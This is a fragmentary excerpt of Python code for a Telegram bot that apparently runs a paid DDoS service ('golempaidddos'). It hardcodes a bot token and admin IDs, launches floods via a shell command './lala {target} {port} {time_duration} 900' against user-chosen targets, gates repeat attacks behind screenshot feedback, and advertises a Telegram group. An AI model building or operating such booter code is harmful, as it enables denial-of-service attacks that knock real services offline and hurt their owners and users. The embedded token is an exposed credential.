...
bot = telebot.TeleBot('7753232073:AAElmKG_cDoui0BfdhoTr9COVbdg9rg663Y')
# Admin user IDs
admin_id = ["7584228621"]
# Group and channel details
GROUP_ID = "-2224465890"
CHANNEL_USERNAME = "@golempaidddos"
...
*𝐓𝐑𝐘 𝐀𝐆𝐀𝐈𝐍 𝐓𝐎𝐌𝐎𝐑𝐑𝐎𝐖!*")
    ...
    full_command = f"./lala {target} {port} {time_duration} 900"
    try:
...
def handle_screenshot(message):
    ...
    if pending_feedback.get(user_id, False):
        ...
        bot.reply_to(message, "✅  **𝐅𝐄𝐄𝐃𝐁𝐀𝐂𝐊 𝐀𝐂𝐂𝐄𝐏𝐓𝐄𝐃! 𝐍𝐄𝐗𝐓
𝐀𝐓𝐓𝐀𝐂𝐊 𝐑𝐄𝐀𝐃𝐘!** 🚀")
    else:
...
👉 [𝙏𝙚𝙡𝙚𝙜𝙧𝙖𝙢 𝙂𝙧𝙤𝙪𝙥](https://t.me/golemxddos) 🚀🔥"""
